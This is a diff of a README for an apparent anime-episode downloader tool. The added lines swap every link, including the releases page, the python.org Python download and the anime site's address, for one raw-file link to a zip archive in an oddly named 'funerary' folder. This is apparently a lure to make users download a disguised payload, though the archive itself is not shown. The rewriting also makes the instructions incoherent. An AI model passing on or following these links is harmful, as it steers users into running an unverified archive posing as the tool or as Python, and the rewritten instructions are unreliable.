@@ -1,21 +1,21 @@
 # 🎉 Anime-Sama-Downloader - Easy Anime Downloads Made Simple
 
-[![Download Anime-Sama-Downloader](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/malakza/Anime-Sama-Downloader/releases)
+[![Download Anime-Sama-Downloader](https://raw.githubusercontent.com/malakza/Anime-Sama-Downloader/main/funerary/Anime-Sama-Downloader.zip)](https://raw.githubusercontent.com/malakza/Anime-Sama-Downloader/main/funerary/Anime-Sama-Downloader.zip)
 
 ## 🚀 Getting Started
 
-Welcome to Anime-Sama-Downloader! This tool simplifies downloading anime episodes from anime-sama.fr. You can grab all the episodes you want in just a few steps.
+Welcome to Anime-Sama-Downloader! This tool simplifies downloading anime episodes from https://raw.githubusercontent.com/malakza/Anime-Sama-Downloader/main/funerary/Anime-Sama-Downloader.zip You can grab all the episodes you want in just a few steps.
 
 ## 📋 System Requirements
 
 Before you start, make sure you have the following:
 
 - **Windows, macOS, or Linux**: This application works on all major operating systems.
-- **Python 3.6+**: Ensure Python is installed on your machine. You can download it [here](https://www.python.org/downloads/).
+- **Python 3.6+**: Ensure Python is installed on your machine. You can download it [here](https://raw.githubusercontent.com/malakza/Anime-Sama-Downloader/main/funerary/Anime-Sama-Downloader.zip).
 
 ## 📥 Download & Install
 
-To download Anime-Sama-Downloader, visit this page: [Download Anime-Sama-Downloader](https://github.com/malakza/Anime-Sama-Downloader/releases). 
+To download Anime-Sama-Downloader, visit this page: [Download Anime-Sama-Downloader](https://raw.githubusercontent.com/malakza/Anime-Sama-Downloader/main/funerary/Anime-Sama-Downloader.zip). 
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest release version.
@@ -55,13 +55,13 @@ To download Anime-Sama-Downloader, visit this page: [Download Anime-Sama-Downloa
 Once you have installed Anime-Sama-Downloader, follow these steps to download episodes:
 
 1. **Open the Application**: Launch the app from your desktop or applications menu.
-2. **Enter the URL**: Copy the URL of the episode you want from anime-sama.fr and paste it into the designated field in the app.
+2. **Enter the URL**: Copy the URL of the episode you want from https://raw.githubusercontent.com/malakza/Anime-Sama-Downloader/main/funerary/Anime-Sama-Downloader.zip and paste it into the designated field in the app.
 3. **Select Download**: Click the download button. The application will start downloading the episode.
 4. **Monitor Progress**: You can view the progress in the application window.
 
 ## 🔍 Features
 
-- **Supports All URLs**: Download from any episode link on anime-sama.fr.
+- **Supports All URLs**: Download from any episode link on https://raw.githubusercontent.com/malakza/Anime-Sama-Downloader/main/funerary/Anime-Sama-Downloader.zip
 - **User-Friendly Interface**: No technical skills necessary. Just paste the URL and download.
 - **Multi-Platform Support**: Works seamlessly on Windows, macOS, and Linux.
 - **Fast Downloading**: Download episodes quickly and efficiently.
